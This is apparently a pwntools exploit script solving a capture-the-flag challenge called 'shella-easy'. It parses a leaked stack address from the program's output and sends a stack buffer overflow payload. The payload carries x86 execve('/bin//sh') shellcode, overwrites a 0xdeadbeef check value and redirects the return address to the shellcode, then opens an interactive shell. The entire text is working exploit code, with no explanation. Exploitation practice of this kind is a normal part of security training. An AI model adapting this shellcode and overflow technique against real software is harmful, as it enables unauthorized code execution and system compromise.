from pwn import *

proc=process('./shella-easy')

payload=''
padd1=0x40
padd2=0x4c
shellcode="\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
target='\xef\xbe\xad\xde'
leak=''
ret=''

#leak

leak = proc.recvline()
leak = leak.strip("Yeah I'll have a ")
leak = leak.strip(" with a side of fries thanks\n")
ret = int(leak, 16)

#payload

payload+=shellcode+'A'*(padd1-len(shellcode))+target
payload+='B'*(padd2-len(payload))
payload+=p32(ret)

#send payload

proc.sendline(payload)
proc.interactive()


